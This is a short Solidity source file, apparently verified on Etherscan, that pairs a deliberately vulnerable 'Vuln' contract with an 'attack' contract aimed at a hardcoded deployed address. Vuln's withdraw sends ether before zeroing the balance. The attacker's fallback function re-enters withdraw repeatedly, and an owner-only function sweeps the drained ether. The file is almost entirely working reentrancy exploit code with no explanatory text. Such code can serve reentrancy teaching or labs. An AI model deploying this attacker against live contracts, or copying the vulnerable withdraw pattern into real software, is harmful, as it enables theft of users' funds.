/**
 *Submitted for verification at Etherscan.io on 2022-12-07
*/

pragma solidity ^0.6.0;

contract Vuln 
{
    mapping(address => uint256) public balances;
    function deposit() public payable 
    {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public 
    {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");
        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

contract attack 
{
    Vuln public vuln_cont = Vuln(address(0xEB81D9a87BbbBf4066be04AdDaDbF03410F1F58d));
    // address vuln_addr = ;
    // Vuln vuln_cont = Vuln(vuln_addr);
    uint256 count = 0;
    address owner;
    address vuln_contract;

    constructor() public{
        owner = msg.sender;
        vuln_contract = address(this);
    }

    function gimmeGimme() public payable 
    {
        vuln_cont.deposit.value(msg.value)();
        vuln_cont.withdraw();
    }

    fallback () external payable 
    {
        if (count < 3)
        {
            count += 1;
            vuln_cont.withdraw();
        }
    }

    function grabEther() public{
        if(msg.sender == owner){
            require(msg.sender.send(address(this).balance));
        }
        
    }
}